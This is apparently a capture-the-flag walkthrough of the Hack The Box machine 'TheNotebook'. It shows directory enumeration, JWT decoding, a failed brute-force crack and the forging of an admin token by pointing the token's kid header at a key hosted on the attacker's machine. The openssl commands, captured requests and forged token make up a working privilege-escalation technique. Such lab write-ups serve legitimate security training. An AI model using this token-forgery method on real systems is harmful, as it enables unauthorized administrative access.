# Process 

# Information about vulnerability: 
```
Target: http://10.129.145.23/

Output File: /home/kali/Desktop/tools/dirsearch/reports/10.129.145.23/21-05-01_23-20-41

[23:20:41] Starting: 
[23:21:06] 403 -    9B  - /admin
[23:22:45] 200 -    1KB - /login
[23:22:46] 302 -  209B  - /logout  ->  http://10.129.145.23/
[23:23:33] 200 -    1KB - /register
```

lOGIN TO http://10.129.145.23/login
test
test

![image](https://user-images.githubusercontent.com/13290445/117746363-90c05a00-b1c9-11eb-8c4f-731270078023.png)




## Initial Shell 

JWT Token:

Login request:

```
POST /login HTTP/1.1
Host: 10.129.145.23
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.145.23
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.145.23/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5odGIiLCJhZG1pbl9jYXAiOmZhbHNlfQ.mE10x1sbOBWS4rqeWirvPh4USRfZyEAz4parlbs2TC5-FoiMMcyylbMBIvh-u2YHcl6Vd3HcTmboTSDQyaXBHhXMsmXu2gswha-TzpLkUhyiMDfZODNzxoRWVrzUDtDp6urU2_nhHHEnGIFUv3aEo56JfiUQs36m3bTe2IZXShGwLcVgWGhT58Bh1fbpvUhbdXNQmKCmWlMaJ50rhHhn3hylEAZkR0aMSjAP5nMaAXRwKwL1jWizZ_nButaUIC_qC0Jn69_7jEMCvt2N-XAsm4i2tjQ8rlBSkiWfmZ0DTcxEYsn10g8VbTphCdh73smWftaZdbMEbRDb8AKZKtEMQP5UgaHI8Y3gnLkQA5K0cuVaczm-xKwHCYUULWcTre4pJ6e7N2-MKf0oAMDWr-3C1BSOJ-yhaVnJpwjiAzTOjtElLihjvJ-Sc4mxcVLWCNxZ9XpZAjz6QMMRtEaWU9cDSCpobujTiOP99jNS9_ETVLFaJLChnCzskdT7Gu4Uz7XnUAUBn-UbpztH04iQgPvrMjlDMT_9XX-FSkLNs1ZDMA9PUpZrFZGJi6loGnXLxBa8x8JalidEbrO9xTOmHzW3b7i694v4qTviZcx3ub_xRE4THv8i1plHJb61oAgt2v_4Xt_um_Inx3lEp1pzscq7A-s9NK5Tgike0agY-Z_-YRQ; uuid=f570e243-c7c9-4512-9e70-0415cc266b2b
Connection: close

username=test&password=test
```

https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

```
kali@kali:~/Documents/HTB/theNotebook/jwt_tool$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVz
dC5odGIiLCJhZG1pbl9jYXAiOmZhbHNlfQ.mE10x1sbOBWS4rqeWirvPh4USRfZyEAz4parlbs2TC5-FoiMMcyylbMBIvh-u2YHcl6Vd3HcTmboTSDQyaXBHhXMsmXu2gswha-TzpLkUhyiMDfZODNzxoRWVrzUDtDp6urU2_nhHHEnGIFUv3aEo56JfiUQs36m3bTe2IZXShGwLcVgWGhT58Bh1fbpvUhbdXNQmKCmWlMaJ50rhHhn3hylEAZkR0aMSjAP5nMaAXRwKwL1jWizZ_nButaUIC_qC0Jn69_7jEMCvt2N-XAsm4i2tjQ8rlBSkiWfmZ0DTcxEYsn10g8VbTphCdh73smWftaZdbMEbRDb8AKZKtEMQP5UgaHI8Y3gnLkQA5K0cuVaczm-xKwHCYUULWcTre4pJ6e7N2-MKf0oAMDWr-3C1BSOJ-yhaVnJpwjiAzTOjtElLihjvJ-Sc4mxcVLWCNxZ9XpZAjz6QMMRtEaWU9cDSCpobujTiOP99jNS9_ETVLFaJLChnCzskdT7Gu4Uz7XnUAUBn-UbpztH04iQgPvrMjlDMT_9XX-FSkLNs1ZDMA9PUpZrFZGJi6loGnXLxBa8x8JalidEbrO9xTOmHzW3b7i694v4qTviZcx3ub_xRE4THv8i1plHJb61oAgt2v_4Xt_um_Inx3lEp1pzscq7A-s9NK5Tgike0agY-Z_-YRQ

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "RS256"
[+] kid = "http://localhost:7070/privKey.key"

Token payload values:
[+] username = "test"
[+] email = "test@test.htb"
[+] admin_cap = False

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

Crack attempt 1: 

```
kali@kali:~/Documents/HTB/theNotebook/c-jwt-cracker$ time ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5odGIiLCJhZG1pbl9jYXAiOmZhbHNlfQ.mE10x1sbOBWS4rqeWirvPh4USRfZyEAz4parlbs2TC5-FoiMMcyylbMBIvh-u2YHcl6Vd3HcTmboTSDQyaXBHhXMsmXu2gswha-TzpLkUhyiMDfZODNzxoRWVrzUDtDp6urU2_nhHHEnGIFUv3aEo56JfiUQs36m3bTe2IZXShGwLcVgWGhT58Bh1fbpvUhbdXNQmKCmWlMaJ50rhHhn3hylEAZkR0aMSjAP5nMaAXRwKwL1jWizZ_nButaUIC_qC0Jn69_7jEMCvt2N-XAsm4i2tjQ8rlBSkiWfmZ0DTcxEYsn10g8VbTphCdh73smWftaZdbMEbRDb8AKZKtEMQP5UgaHI8Y3gnLkQA5K0cuVaczm-xKwHCYUULWcTre4pJ6e7N2-MKf0oAMDWr-3C1BSOJ-yhaVnJpwjiAzTOjtElLihjvJ-Sc4mxcVLWCNxZ9XpZAjz6QMMRtEaWU9cDSCpobujTiOP99jNS9_ETVLFaJLChnCzskdT7Gu4Uz7XnUAUBn-UbpztH04iQgPvrMjlDMT_9XX-FSkLNs1ZDMA9PUpZrFZGJi6loGnXLxBa8x8JalidEbrO9xTOmHzW3b7i694v4qTviZcx3ub_xRE4THv8i1plHJb61oAgt2v_4Xt_um_Inx3lEp1pzscq7A-s9NK5Tgike0agY-Z_-YRQ

No solution found :-(

real    552m14.812s
user    2193m40.510s
sys     2m33.734s
```

https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

![image](https://user-images.githubusercontent.com/13290445/117746473-b9485400-b1c9-11eb-8e18-51214fff41fa.png)


1. Generate the Certificate
```
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
2. Copy the Public.pem and the attacker.key to jwt.io to generate the new Token, also change the admin to 1 and the server to reitrive the key from your local system:

![image](https://user-images.githubusercontent.com/13290445/117746550-d2510500-b1c9-11eb-9e60-df308742514c.png)

![image](https://user-images.githubusercontent.com/13290445/117746566-dbda6d00-b1c9-11eb-83da-2f7a10447e3f.png)


New token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC43OTo4MDgxL3B1YmxpY0tleS5wZW0ifQ.eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5odGIiLCJhZG1pbl9jYXAiOjF9.5lOJndGjxKGg1VSD90pmV3PV7zSFQgyeSJsTG1rY-P7gXQ2USOfCRq0ophVQSM10eVl1GGxG44lzI0KaVvp-t50FQ-X_PiAIqAKxP7L9UYOxhD-zD5x_TIoyDUFNvB3QobzXIKhz3jwBQ1eut9VLH_qpoN0AbVMvUrJ7JDyx3vjFjI6xxyp6cwuTPbue1NQHUkLF2MiPTT6s0iP5BuT9VpKiLbh5uDsMYJ6SWkISVOqMvKoQOqVgP0NWQZSsqkhEdpG_IwsBv_72c87bGp1DHHyIQbeEEWKtw8QkxfROmo6kvkWj010rI1iQ3T6gy0m9DrinGzqGoAvmqCajbnOw6g
```

![image](https://user-images.githubusercontent.com/13290445/117746611-eb59b600-b1c9-11eb-975a-c29c339c86b0.png)
